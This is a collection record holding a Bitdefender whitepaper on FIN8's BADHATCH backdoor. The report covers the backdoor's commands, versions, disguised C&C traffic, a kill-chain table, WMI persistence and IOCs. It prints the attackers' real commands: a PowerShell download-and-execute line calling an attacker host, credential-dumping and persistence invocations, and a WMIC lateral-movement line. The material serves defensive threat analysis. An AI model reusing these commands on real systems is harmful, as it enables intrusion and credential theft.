{
    "id": "0802b7d1-1d92-44f9-9439-03f0ad070d5d",
    "created_at": "2022-10-25T16:48:13.7975Z",
    "updated_at": "2025-03-27T02:09:42.994283Z",
    "deleted_at": null,
    "sha1_hash": "412f70c02f7582ed56e48d5ab2fb62d5fc37c064",
    "title": "Macintosh HD:Users:Shared:dd:4work:Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en_EN:Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en_EN.indd",
    "authors": "",
    "file_creation_date": "2021-03-10T12:18:50Z",
    "file_modification_date": "2021-03-10T12:18:58Z",
    "file_size": 4789837,
    "plain_text": "### Security\n# FIN8 Returns with Improved BADHATCH Toolkit\n\nwww.bitdefender.com\n\n\n-----\n\n## Contents\n\nForeword................................................................................................................................................................3\nKey Findings..........................................................................................................................................................3\nDissecting the latest version of the BADHATCH malware..................................................................................3\nThe evolution of BADHATCH ...............................................................................................................................7\nCommunication Protocol......................................................................................................................................8\nAttack scenario.....................................................................................................................................................9\nPersistence Mechanism.................................................................................................................................... 12\nVictims................................................................................................................................................................ 13\n\n## Contents\n\nRecommendations............................................................................................................................................. 13\nIOCs..................................................................................................................................................................... 14\n\n\n-----\n\nFIN8 Returns with Improved BADHATCH Toolkit\n\n\nThis section provides technical details about\nthe latest version of BADHATCH malware,\nwhich is currently v2.14. The command line that\ncaught our attention is “powershell.exe -nop\n**$pa=’sys’;iex (New-Object System.Net.WebClient).**\n**DownloadString(‘https://192-129-189-73[.]sslip[.]io/**\n**yo’)”. It abuses sslip.io - a service that provides free IP**\nto domain mapping to make SSL certificate generation\neasier (for traffic encryption). While the service is\nlegitimate and widely used, the malware abuses it in an\nattempt at evading detection.\n\nThe malware deployment is started by the malicious\nPowerShell command line that downloads the\nscript from **‘https://192-129-189-73[.]sslip[.]**\n**io/yo’ and executes it. The script (which at**\none point in the investigation was identified as\nc328b3714df8400f4d4c071edb1f6d3b82d42\n488ebf8d9437c300bec9108755b) uses two variables,\n**$** **b** d $ lik th t i d t th b 64\n\n\n-----\n\nFIN8 Returns with Improved BADHATCH Toolkit\n\nrepresentations of shellcode for the x86 and x64 architectures, respectively. To execute the shellcode, a .NET binary\nis used (eg. 3b185ff12a5fface0148adaf07037d7d17f8a0d49b64cf802f72be1970ac4241) that loads it in memory and\nruns it in a new thread.\n\nThe shellcode contains the BADHATCH DLL compressed with the ApLib algorithm.\n\nOnce loaded, the embedded DLL obtains the value of the Y1US environment variable and extracts the string that\ncontains options for behavior customization. A list of possible values observed in samples found is presented below:\n\n**Y1US value patterns** **Remark**\n\n**proxy:<ip in dot form>:<port>** Uses the given socks5 proxy to connect to C&C server\n\n**sv** Injects itself into a new “svchost.exe –k netsvcs” process using APC\n\n**sys** Impersonates lsass.exe/vmtoolsd.exe token, then follows the same steps\nas in the case of sv option\n\n**ex** Injects itself into existing explorer.exe process by using\n**RtlCreateUserThread**\n\n**inj:<process id>** Injects itself into the process the PID of which is indicated\n\n_Y1US patterns_\n\nThe mentioned environment variable is set by the deployment script as follows: $env:Y1US=$pa. The $pa variable is\nprovided in the command line of the PowerShell process, “sys” being the only value we observed to be used by the\nattackers.\n\nWe should mention that many indicators remain unchanged since the release of the GIGAMON report, like the event\nobject named Local\\\\{45292C4F-AABA-49ae-9D2E-EAF338F50DF4} that is used to ensure that only one running\ninstance of malware exists and the asynchronous TLS-wrapped channel that intercepts TCP connections to the C&C\nand encrypts the traffic. The TLS wrapper is implemented using the Windows IO Completion PORT APIs and internally,\nit uses the already reported CompletionKeys “nScS” and “rScs”. The port that is opened and bound on localhost,\nhowever, may not always be 3885 as previously reported – it is increased if the current value is already used, the\nupper bound being the value of 4005.\n\nThe BADHATCH banner went through several changes and the malware shows a version that looks like the one below:\n\n---------------------------------------\n - SH version %u.%u build %u %s\n---------------------------------------\nUSING PROXY: %u.%u.%u.%u:%u\n\nOS: %s%s SP %d %s (%d.%d.%d)\nHOSTNAME: %s\nCLIENT ID: %08X-%08X-%08X-%08X-%08X-SH\n\n_Badhatch shell banner (the line with proxy parameters is present only if the Y1US variable contains such option)_\n\nThe shell has two operating modes. Depending on the instruction received from the C&C, it can use either the CMD or\nPOWERSHELL mode. After the mode type is received, the shell launches a process of either cmd.exe or powershell.exe\nthat is used to execute commands. Besides the normal commands each process can execute, the BADHATCH shell\ni l\n\n|Y1US value patterns|Remark|\n|---|---|\n|proxy:<ip in dot form>:<port>|Uses the given socks5 proxy to connect to C&C server|\n|sv|Injects itself into a new “svchost.exe –k netsvcs” process using APC|\n|sys|Impersonates lsass.exe/vmtoolsd.exe token, then follows the same steps as in the case of sv option|\n|ex|Injects itself into existing explorer.exe process by using RtlCreateUserThread|\n|inj:<process id>|Injects itself into the process the PID of which is indicated|\n\n\n-----\n\nFIN8 Returns with Improved BADHATCH Toolkit\n\nIn the POWERSHELL mode, powershell.exe is launched with the following command line - %systemroot%\\\\\n**system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -nop -noni -ep bypass -c iex($env:c) and the environment**\nvariable “c” is set with a piece of PowerShell code that reads commands from a pipe and executes it using the IEX.\nInterestingly, we noticed that the first command written to that pipe is a PowerShell script that loads six custom\ncommands – info, Ping-Comp, Check-Port, Check-Share, psx and GetComputerInfo. More information on supported\ncommands in the POWERSHELL mode is presented in the table:\n\n**Command** **Remark**\n\nObtains the current system information such as SHELL PID (pid of powershell.exe),\ninfo **PSVERSION, HOSTNAME, USER, LOGONSERVER, LASTBOOTUP, DATETIME, UPTIME as**\nwell as integrity level of current process\n\nUses a PowerShell object of type System.Net.NetworkInformation.Ping to ping a\nPing-Comp <target>\ncomputer\n\nCheck-Port <target> <port> [ Check if the indicated port of a target computer is open by establishing a TCP ]\nconnection\nCheck-Share <target> Checks if the user can access the $C share on the target computer\n\npsx <target> Lists the processes running on the target computer\n\nObtains information like disk information, OS type, logged users, system information for\nGetComputerInfo <target>\na remote computer using WMI\nterminate Terminates the shell\n\nsleep <int> Sleeps for a given number of minutes\n\nExecutes the info command on the remote computer (it uses a remote pipe named\nremote <target> **psh444) – it is unclear how the process on the remote computer that would read from**\nthat pipe is started\ninject <PID> Injects the BADHATCH into the process with the given PID\n\nReceives a PowerShell module from the C&C server and sends it through the pipe to the\npsm\nPowerShell process to be executed (there is a size limit of 10 MB)\nmem Receives a DLL and loads it in the current process\n\ncve Receives a DLL and loads it in the spawned cmd.exe/powershell.exe process\n\nhost Sends OS version and hostname to the C&C server\n\nid Sends CLIENT_ID to the C&C server\n\npid Sends the PID and process name of current process\n\nupload <file> Uploads the given file to the C&C sever\n\nuac <cmd line> Executes an UAC bypass using CMSTPLUA COM interface\n\ndownload <path> Receives content from the C&C server and saves it to the indicated file\n\nwhoami Executes whoami.exe\n\nscr Takes a screenshot and sends it to the C&C server\n\n_v2.14 psh shell supported commands_\n\nIn the CMD mode, the shell uses a process of cmd.exe and implements a different set of commands (including the\nfollowing commands that behave like in the PowerShell mode: terminate, sleep, inject, mem, cve, whoami, host, id,\n**pid, scr, upload and download):**\n\n**Command** **Remark**\n\nImpersonates the token of process with the given PID and injects the\nspawn <PID>\nBADHATCH into a new svchost.exe\n\nproxy local <start|stop><port> Binds to 0 0 0 0:<port> and acts like a socks4 socks5 and http proxy\n\n|Command|Remark|\n|---|---|\n|info|Obtains the current system information such as SHELL PID (pid of powershell.exe), PSVERSION, HOSTNAME, USER, LOGONSERVER, LASTBOOTUP, DATETIME, UPTIME as well as integrity level of current process|\n|Ping-Comp <target>|Uses a PowerShell object of type System.Net.NetworkInformation.Ping to ping a computer|\n|Check-Port <target> <port>|Check if the indicated port of a target computer is open by establishing a TCP connection|\n|Check-Share <target>|Checks if the user can access the $C share on the target computer|\n|psx <target>|Lists the processes running on the target computer|\n|GetComputerInfo <target>|Obtains information like disk information, OS type, logged users, system information for a remote computer using WMI|\n|terminate|Terminates the shell|\n|sleep <int>|Sleeps for a given number of minutes|\n|remote <target>|Executes the info command on the remote computer (it uses a remote pipe named psh444) – it is unclear how the process on the remote computer that would read from that pipe is started|\n|inject <PID>|Injects the BADHATCH into the process with the given PID|\n|psm|Receives a PowerShell module from the C&C server and sends it through the pipe to the PowerShell process to be executed (there is a size limit of 10 MB)|\n|mem|Receives a DLL and loads it in the current process|\n|cve|Receives a DLL and loads it in the spawned cmd.exe/powershell.exe process|\n|host|Sends OS version and hostname to the C&C server|\n|id|Sends CLIENT_ID to the C&C server|\n|pid|Sends the PID and process name of current process|\n|upload <file>|Uploads the given file to the C&C sever|\n|uac <cmd line>|Executes an UAC bypass using CMSTPLUA COM interface|\n|download <path>|Receives content from the C&C server and saves it to the indicated file|\n|whoami|Executes whoami.exe|\n|scr|Takes a screenshot and sends it to the C&C server|\n\n|Command|Remark|\n|---|---|\n|spawn <PID>|Impersonates the token of process with the given PID and injects the BADHATCH into a new svchost.exe|\n\n\n-----\n\nFIN8 Returns with Improved BADHATCH Toolkit\n\n**Command** **Remark**\n\nproxy bc\n\nproxy status\n\nftp <status|start|stop>\nis replaced with “\\\\”)\n\nspid\n\nsteal\n\nrevert\n\nex\nC&C server\n\neventlog <status|suspend|resume>\nEventLog Service\n\n_v2.14 cmd.exe shell supported commands (unique to CMD mode)_\n\n|Command|Remark|\n|---|---|\n|proxy bc|Acts like a reverse proxy; Connects to C&C, receive the destination IP and port as well as the traffic to push to the destination|\n|proxy status|Print info for the active connections on LOCAL and BC|\n|ftp <status|start|stop>|Acts like an ftp server; Connects to C&C and receives ftp commands; it can also interact with SMB shares (receives paths with “smb\\” prefix that is replaced with “\\\\”)|\n|spid|Sends the PID of spawned cmd.exe|\n|steal|Impersonates the token of the process with the given PID and creates a new cmd.exe process that is used for command execution|\n|revert|Terminates the cmd.exe process created by the “steal” command|\n|ex|Sends the PID of explorer.exe and the corresponding domain user to the C&C server|\n|eventlog <status|suspend|resume>|Manipulates the main-thread state of the process responsible for EventLog Service|\n\n\n-----\n\nFIN8 Returns with Improved BADHATCH Toolkit\n\n## The evolution of BADHATCH\n\nBy extracting the version numbers from the collected samples, we were able to identify three versions of the malware\n– v2.12, v2.13, and v2.14. Moreover, during the monitoring process we captured the moment of an update from v2.13\nto v.2.14 – the update took place on 2020-12-13, although the compile time of the extracted samples indicated 202012-06 as the moment of the switch.\n\nWe put all the facts together and created a timeline of different campaigns where BADHATCH was used. This\nchronology is based partly on the compile time of malicious samples and partly on information derived from\nmonitoring the URL that distributes the PowerShell scripts which are used to deploy BADHATCH.\n\n#### 2020-04-29 2020-06-18 2020-08-07 2020-09-26 2020-11-15 2021-01-04 2021-02-23\n\n v2.12/v2.13\n\n v2.13\n\n v.2.14\n\nEach version implements, modifies or deletes some features as illustrated in the following table:\n\n**Feature** **V2.12** **V2.13** **V2.14**\n\nTries to obtain lsass.exe token,\n\nTries to obtain lsass.exe token; If\n\nSYSTEM then vmtoolsd.exe token; If a Same behavior as in\n\na token is obtained – it is used\n\ntoken impersonation token is obtained – it is used v2.13\n\nto call CreateProcessAsUserW\n\nto call CreateProcessAsUserW\n\nConfigurable; There is\na global variable that\n\nThe execution flow always sends indicates to send http\nHTTP request Same as in v2.12\nHTTP request headers request with spoofed\n\nheaders or to bypass this\nstep\n\nThe hash is received\nfrom C&C; Pass-the\nNTLM hash injection  \n\nhash is implemented\nonly in x64 versions;\n\nUses schtasks.exe and the\n**uac2 command**  \nSilentCleandup task;\n\n**ftp commands**   \n\n**revert command**   \n\nstatus, suspend, resume status, suspend, resume\n\n**eventlog commands **\n\nimplemented implemented\n\n_Differences between the 3 BADHATCH versions_\n\n|9 2020-06-18 2020-08-07 2020-09-|26 2020-11-15|\n|---|---|\n\n|– v2.12, v2.13, and v2.14. Moreover, during the monitoring process we captured the moment of an update from v2.13 to v.2.14 – the update took place on 2020-12-13, although the compile time of the extracted samples indicated 2020- 12-06 as the moment of the switch. We put all the facts together and created a timeline of different campaigns where BADHATCH was used. This chronology is based partly on the compile time of malicious samples and partly on information derived from monitoring the URL that distributes the PowerShell scripts which are used to deploy BADHATCH. 2020-04-29 2020-06-18 2020-08-07 2020-09-26 2020-11-15 2021-01-04 2021-02-23 v2.12/v2.13 v2.13 v.2.14 Each version implements, modifies or deletes some features as illustrated in the following table: Feature V2.12 V2.13 V2.14|Col2|Col3|Col4|\n|---|---|---|---|\n|SYSTEM token impersonation HTTP request NTLM hash injection uac2 command ftp commands revert command eventlog commands|Tries to obtain lsass.exe token; If a token is obtained – it is used to call CreateProcessAsUserW|Tries to obtain lsass.exe token, then vmtoolsd.exe token; If a token is obtained – it is used to call CreateProcessAsUserW||\n||The execution flow always sends HTTP request headers|Same as in v2.12|Configurable; There is a global variable that indicates to send http request with spoofed headers or to bypass this step|\n||||The hash is received from C&C; Pass-the- hash is implemented only in x64 versions;|\n||Uses schtasks.exe and the SilentCleandup task;|||\n|||||\n|||||\n|||status, suspend, resume implemented|status, suspend, resume implemented|\n\n\n-----\n\nFIN8 Returns with Improved BADHATCH Toolkit\n\n## Communication Protocol\n\nThe communication protocol seems to be adapted to evade detection because, in order to establish a connection to\nC&C, the malware sends an HTTP request that masquerades as a legitimate one:\n\nV2.13/V2.14 http request:\n\nGET http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab?<random 8\nhex chars><random 8 hex chars> HTTP/1.1\nConnection: Keep-Alive\nAccept: */*\nIf-None-Match: “<random 8 hex chars><random 8 hex chars>:0”\nUser-Agent: Microsoft-CryptoAPI/<win.major_version>.<win.minor_version>\nHost: ctldl.windowsupdate.com\nCookie: PHPSESSID=<hex client id>\n\nV2.12 http request:\n\nGET /fwlink/?LinkId=<random 6 digit int> HTTP/1.1\nAccept: text/html, application/xhtml+xml, */*\nAccept-Language: en-US,en\nUser-Agent: Mozilla/5.0 (Windows NT<win.major_version>.<win.minor_version>; Trident/7.0; rv:11.0) like Gecko\nAccept-Encoding: gzip, deflate\nConnection: Keep-Alive\nHost: go.microsoft.com\nCookie: PHPSESSID=<hex client id>\n\nWe identified two C&C servers (for v2.13/v2.14) 192[.]52[.]167[.]199 and 104[.]168[.]145[.]204 that were up when we\nstarted our investigation. Both servers were running an instance of nginx/1.14.1 (as revealed by Shodan)\nand we presume that the attackers used this software as a proxy that performed the TLS encryption of the traffic and\nthe redirection of decrypted data to the actual C&C application.\n\nAn important observation after sending a few modified requests is that it seems the PHPSESSID that contains the\nCLIENT_ID is validated on the server side (CLIENT_ID contains a chain of CRCs on some system information) and, if\nthe check fails, the server responds with HTTP code 404.\n\n\n-----\n\nFIN8 Returns with Improved BADHATCH Toolkit\n\n## Attack scenario\n\nTo get a clearer picture of how attackers operated after compromising the victim, we collected the related command\nlines and grouped them by tactics while preserving the chronology of events:\n\n|Kill chain step|Commands|Remark|MITRE TTPS|\n|---|---|---|---|\n|Initial Access||unknown||\n|Privilege Escalation|• cmd.exe /Q /c cd \\\\ 1> \\\\\\\\127.0.0.1\\\\AD- MIN$\\\\__1607046502.0308208 2>&1 • cmd.exe /Q /c cd 1> \\\\\\\\127.0.0.1\\\\AD- MIN$\\\\__1607046502.0308208 2>&1 • cmd.exe /Q /c powershell.exe -nop $pa=’sys’;iex (New-Object Sys- tem.Net.WebClient).Download- String(‘https://192-129-189-73. sslip.io/yo’) 1> \\\\\\\\127.0.0.1\\\\AD- MIN$\\\\__1607046502.0308208 2>&1 • cmd.exe /Q /c ping -n 1 8.8.8.8 1> \\\\\\\\127.0.0.1\\\\AD- MIN$\\\\__1607046502.0308208 2>&1 • cd Windows\\Temp • dir sh-tmp.ps1 • powershell.exe -nop -ep bypass -c C:\\\\ Windows\\\\Temp\\\\sh-tmp.ps1 sys|This group of commands reflect the deployment of BADHATCH malware which we believe is responsible for downloading the sh- tmp.ps1 script. Although we were unable to obtain the sh-tmp.ps1, many things indicate that this script is responsible for the privilege escalation step. The most important clue is that after the script execution, all subsequent commands are executed on behalf of SYSTEM user.|• Process Injec- tion(T1055) • Asynchro- nous Procedure Call(T1055.004) • Access Token Ma- nipulation(T1134) • Create Process with Token( T1134.002)|\n|Persistence|• powershell.exe -nop -ep bypass -c c:\\\\ windows\\\\temp\\\\m.ps1 f9eef8b27ff- 68f41a8eb0b8739370640 • powershell.exe -nop -c System.Reflection. Assembly::Load(System.Convert::From- Base64String((WmiClass ‘root\\\\cim- v2:Win32_Base64Class’).Properties’Prop’. Value));utYEb.a6Kxxs::Ye5d(10)|The telemetry data suggests that the m.ps1 script has installed the persistence that triggered the execution of the second presented PowerShell command line.|• Event Triggered Exe- cution(T1546) • Windows Manage- ment Instrumenta- tion Event Subscrip- tion(T1546.003)|\n\n\n-----\n\nFIN8 Returns with Improved BADHATCH Toolkit\n\n|Kill chain step|Commands|Remark|MITRE TTPS|\n|---|---|---|---|\n|Discovery|systeminfo.exe tasklist.exe ipconfig.exe /all net.exe group ”domain admins” /domain whoami.exe netstat.exe –f|These commands reflect the system fingerprinting|System Information Discovery(T1082) Process Discov- ery( T1057) System Network Configuration Discov- ery(T1016) Permission Groups Discovery(T1069) Domain Groups(T1069.002) System Owner/User Discovery(T1033) System Network Connections Discov- ery(T1049)|\n|Credential Access|powershell.exe -nop -ep bypass -c c:\\\\win- dows\\\\temp\\\\mimi.ps1 786c34ba841a259d- 0c8945503d0b6d89c46e9245|The name of the script suggests that this is probably a mimikatz script, but this is speculation because we were unable to get it. However, we are sure that the credentials were dumped, because the following commands from Discovery were executed on behalf of another domain user, probably a domain admin. Moreover, there are traces in telemetry from behavioral monitoring (ATC) that the PowerShell process read the memory of lsass.exe|OS Credential Dump- ing(T1003) OS Credential Dump- ing: LSASS Memo- ry(T1003.001) Process Injec- tion(T1055)|\n\n\n-----\n\nFIN8 Returns with Improved BADHATCH Toolkit\n\n**Kill chain step** **Commands** **Remark** **MITRE TTPS**\nDiscovery tasklist.exe /v The discovery of the Process Discov\nDomain Controller. ery( T1057)\n\nwhoami.exe\n\nPermission Groups\n\ntasklist.exe /v| findstr.exe explorer Discovery(T1069)\n\nnet.exe group “domain admins” /domain Domain\n\nGroups(T1069.002)\n\nnltest.exe /domain_trusts\n\nSystem Owner/User\n\nping.exe –n 1 <domain fqdn>\n\nDiscovery(T1033)\n\nDomain Trust Discovery(T1482)\n\nLateral wmic.exe /node:<local ip of DC> pro- The deployment of the Windows Management\nMovement cess call create \\cmd /c powershell. BADHATCH on Domain Instrumentation(T1047)\nexe -nop $pa=’sys’;iex (New-Object Controller.\nSystem.Net.WebClient).DownloadString(‘https://192-129-189-73.sslip.io/\nyo’)\\””\n\nOther steps cmd.exe /c powershell.exe -nop -ep bypass The telemetry data\n-c c:\\\\windows\\\\temp\\\\m.ps1 sys indicates that the\nsame persistence was\ninstalled on DC.\nThe redirection of the output to “1> \\\\\\\\127.0.0.1\\\\ADMIN$\\\\__<unix timestamp> 2>&1” suggests that the actor uses\nthe wmiexec.py tool from Impacket.\n\n|Kill chain step|Commands|Remark|MITRE TTPS|\n|---|---|---|---|\n|Discovery|tasklist.exe /v whoami.exe tasklist.exe /v| findstr.exe explorer net.exe group “domain admins” /domain nltest.exe /domain_trusts ping.exe –n 1 <domain fqdn>|The discovery of the Domain Controller.|Process Discov- ery( T1057) Permission Groups Discovery(T1069) Domain Groups(T1069.002) System Owner/User Discovery(T1033) Domain Trust Discov- ery(T1482)|\n|Lateral Movement|wmic.exe /node:<local ip of DC> pro- cess call create \\cmd /c powershell. exe -nop $pa=’sys’;iex (New-Object System.Net.WebClient).Download- String(‘https://192-129-189-73.sslip.io/ yo’)\\””|The deployment of the BADHATCH on Domain Controller.|Windows Management Instrumentation(T1047)|\n|Other steps|cmd.exe /c powershell.exe -nop -ep bypass -c c:\\\\windows\\\\temp\\\\m.ps1 sys|The telemetry data indicates that the same persistence was installed on DC.||\n\n\n-----\n\nFIN8 Returns with Improved BADHATCH Toolkit\n\n## Persistence Mechanism\n\nThe attackers used the WMI event subscription mechanism to ensure persistence. Even though we couldn’t get\nthe PowerShell scripts listed in this section, we gathered the traces that indicate that the “powershell.exe -nop\n**-ep bypass -c c:\\\\windows\\\\temp\\\\m.ps1 f9eef8b27ff68f41a8eb0b8739370640” command line is responsible**\nfor persistence setup. As a result, it creates an event consumer named PerfData having the “powershell.exe -nop\n**-c [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(([WmiClass] ‘root\\\\cimv2:Win32_**\n**Base64Class’).Properties[‘Prop’].Value));[utYEb.a6Kxxs]::Ye5d(10)” command line associated with it. It also creates**\ntwo event filters, named PerfOsOnce and PerfOs, which we believe should trigger the consumer command line.\n\nThe specifics of the CommandLineEventConsumer suggests that the script that installs the persistence creates a\nWMI object names Win32_Base64Class that has a propriety name “Prop” that contains a base64 string representation\nof a .Net binary. From that command line, it is clear that the .Net binary uses the namespace utYEb, the public class\n**a6Kxxs that has the Ye5d method. We encounter a few such command lines that will be presented in the IOC section.**\nAlthough we couldn’t obtain the content of that WMI object, the behavioral telemetry suggests that it creates a\nsvchost.exe process used for injecting code into it using APC mechanism.\n\n\n-----\n\nFIN8 Returns with Improved BADHATCH Toolkit\n\n## Victims\n\nOver the past year, we identified that the actor targeted its victims in countries such as the United States, Canada,\nSouth Africa, Puerto Rico, Panama and Italy, as seen on the map:\n\nThe identified industries are insurance, retail, technology and chemicals.\n\n## Recommendations\n\nLike most persistent and skilled cyber-crime actors, FIN8 operators are constantly refining their tools and tactics\nto avoid detection. Bitdefender recommends that merchants take the following actions to minimize the impact of\nfinancial malware:\n\n- Separate the POS network from the ones used by employees or guests\n\n- Introduce cybersecurity awareness training for employees to help them spot phishing e-mails. Tune the e-mail\nsecurity solution to automatically discard malicious or suspicious attachments.\n\n- Integrate threat intelligence into existing SIEM or security controls for relevant Indicators of Compromise.\n\n- Small and medium organizations without a dedicated security team should consider outsourcing security\noperations to professional Managed Detection and Response providers.\n\n\n-----\n\nFIN8 Returns with Improved BADHATCH Toolkit\n\n## IOCs\n\n\nC&C\n\n\n192[.]52[.]167[.]199\n\n104[.]168[.]145[.]204\n\nus-west[.]com\n\n\nServers for distributing PowerShell scripts\n\n\nhttps://192-129-189-73[.]sslip[.]io/yo\n\nhttps://192-129-189-73[.]sslip[.]io/80\n\nhttps://198-46-140-52.sslip[.]io/xxx\n\n198[.]46[.]140[.]52\n\n192[.]129[.]189[.]73\n\n\nBADHATCH samples\n\n\na9dcdf037d39e88bc71ae844971e63aa78379d50ce47e8aaad0e4b1baf6c7040\n\nda89d50220da32060ef38546d1160162637ff72e3c3fa2268febca9331eb5adc\n\n8637b972d5db5c4cb152b0a42f4866c9b574e68023b7620911af8e3d472d4701\n\n5634140992891d2382fa103031b96023b75470ecd1bf0cf88006a45e63ef41bc\n\nee188b38b4ab978e71a84fe20b9609d888832f2f543a5ec6aa112d61450986d1\n\n6f0f702fc0f0a5420a1dbaf1aa88b13b557bebc2631a4157b8e026d80f7651b2\n\n32863daa615afbb3e90e3dad35ad47199050333a2aaed57e5065131344206fe1\n\ne058280f4b15c1be6488049e0bdba555f1baf42e139b7251d6b2c230e28e0aef\n\naa07611ce06d7482c1d2d2f26c8721d6833718abd72360b81598bc2935811dcb\n\ncb28e7980ba2f1c718cd96401b9290719e7748ab9987abcf9ad9e376f6f60b37\n\n\n-----\n\nFIN8 Returns with Improved BADHATCH Toolkit\n\n\nCommand Lines\n\n\npowershell -nop -ep bypass -c C:\\\\Windows\\\\Temp\\\\sh-tmp.ps1 sys\n\npowershell.exe -nop -ep bypass -c c:\\\\windows\\\\temp\\\\mim.ps1\n786c34ba841a259d0c8945503d0b6d89c46e9245\n\npowershell.exe -nop -ep bypass -c c:\\\\windows\\\\temp\\\\mimi.ps1\n786c34ba841a259d0c8945503d0b6d89c46e9245\n\npowershell.exe -nop -ep bypass -c c:\\\\windows\\\\temp\\\\m.ps1\nf9eef8b27ff68f41a8eb0b8739370640\n\npowershell.exe -nop -ep bypass -c c:\\\\Windows\\\\temp\\\\mldr2.ps1\nf9eef8b27ff68f41a8eb0b8739370640\n\npowershell.exe -nop -ep bypass -c C:\\\\Windows\\\\Temp\\\\sh.ps1 sys\n\npowershell.exe -nop $pa=’sys’;iex (New-Object System.Net.WebClient).\nDownloadString(‘https://192-129-189-73.sslip[.]io/80’)\n\npowershell.exe -nop $pa=’sys’;iex (New-Object System.Net.WebClient).\nDownloadString(‘https://192-129-189-73.sslip[.]io/yo’)\n\npowershell.exe -nop $pa=’sys’;iex (New-Object System.Net.WebClient).\nDownloadString(‘https://198-46-140-52.sslip[.]io/xxx’)\n\npowershell.exe -nop -c [System.Reflection.Assembly]::Load([System.\nConvert]::FromBase64String(([WmiClass] ‘root\\cimv2:Win32_Base64Class’).Properties[‘Prop’].\nValue));[utYEb.a6Kxxs]::Ye5d(10)\n\npowershell.exe -nop -c [System.Reflection.Assembly]::Load([System.\nConvert]::FromBase64String(([WmiClass] ‘root\\\\cimv2:Win32_Base64Class’).Properties[‘Prop’].\nValue));[Inrcp6.ylN8K]::ATka(10)\n\npowershell.exe -nop -c [System.Reflection.Assembly]::Load([System.\nConvert]::FromBase64String(([WmiClass] ‘root\\\\cimv2:Win32_Base64Class’).Properties[‘Prop’].\nValue));[m5cW.i6guL]::ZOoS(10)\n\n\nBADHATCH deployment scripts\n\n\ndbb3a665f9460343eb7625f8625815179e63aaa83f91b9283a296142ec4b2bbb\n\nc328b3714df8400f4d4c071edb1f6d3b82d42488ebf8d9437c300bec9108755b\n\n981ecfc67d7192f0e82f3f8042d7c26c78396a3a62e5e34c717db31aee566eca\n\n428cf5d05d9c3d4f7601ff785a175c1d86a90fe060a1f33976b363e8f9530a88\n\n355d200eebf9d9102d5f2ba0c8a576948aef43640ae8f0eedf101e0e881be0b0\n\n\n-----\n\nFIN8 Returns with Improved BADHATCH Toolkit\n\n\n-----\n\n#### Proudly Serving Our Customers Dedicated To Our +20.000 Worldwide Partners\nBitdefender provides solutions and services for small business and A channel-exclusive vendor, Bitdefender is proud to share success with tens of\nmedium enterprises, service providers and technology integrators. We take thousands of resellers and distributors worldwide.\npride in the trust that enterprises such as Mentor, Honeywell, Yamaha,\n**Speedway, Esurance or Safe Systems place in us.** _CRN 5-Star Partner, 4th Year in a Row. Recognized on CRN’s Security 100 List. CRN Cloud_\n\n_Partner, 2nd year in a Row_\n\n_Leader in Forrester’s inaugural Wave™ for Cloud Workload Security_\n\n_More MSP-integrated solutions than any other security vendor_\n\n_NSS Labs “Recommended” Rating in the NSS Labs AEP Group Test_\n\n_3 Bitdefender Partner Programs - to enable all our partners – resellers, service providers_\n\n_SC Media Industry Innovator Award for Hypervisor Introspection, 2nd Year in_ _and hybrid partners – to focus on selling Bitdefender solutions that match their own_\n_a Row_ _specializations_\n\n_Gartner® Representative Vendor of Cloud-Workload Protection Platforms_\n\n#### Trusted Security Authority\nBitdefender is a proud technology alliance partner to major virtualization vendors, directly contributing to the development of secure ecosystems with\n**VMware, Nutanix, Citrix, Linux Foundation, Microsoft, AWS, and Pivotal.**\n\nThrough its leading forensics team, Bitdefender is also actively engaged in countering international cybercrime together with major law enforcement agencies\nsuch as FBI and Europol, in initiatives such as NoMoreRansom and TechAccord, as well as the takedown of black markets such as Hansa. Starting in 2019,\nBitdefender is also a proudly appointed CVE Numbering Authority in MITRE Partnership.\n\n**RECOGNIZED BY LEADING ANALYSTS AND INDEPENDENT TESTING ORGANIZATIONS** **TECHNOLOGY ALLIANCES**\n\n#### UNDER THE SIGN OF THE WOLF\n\n**Founded 2001, Romania** A trade of brilliance, data security is an industry where only the clearest view, sharpest mind and deepest insight can\n**Number of employees 1800+** win — a game with zero margin of error. Our job is to win every single time, one thousand times out of one thousand,\n\nand one million times out of one million.\n\n**Headquarters**\nEnterprise HQ – Santa Clara, CA, United States And we do. We outsmart the industry not only by having the clearest view, the sharpest mind and the deepest insight,\nTechnology HQ – Bucharest, Romania but by staying one step ahead of everybody else, be they black hats or fellow security experts. The brilliance of our\n\ncollective mind is like a luminous Dragon-Wolf on your side, powered by engineered intuition, created to guard against\n\n**WORLDWIDE OFFICES** all dangers hidden in the arcane intricacies of the digital realm.\n**USA & Canada: Ft. Lauderdale, FL | Santa Clara, CA | San Antonio, TX |**\nToronto, CA This brilliance is our superpower and we put it at the core of all our game-changing products and solutions.\n**Europe: Copenhagen, DENMARK | Paris, FRANCE | München, GERMANY**\n| Milan, ITALY | Bucharest, Iasi, Cluj, Timisoara, ROMANIA | Barcelona,\nSPAIN | Dubai, UAE | London, UK | Hague, NETHERLANDS\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
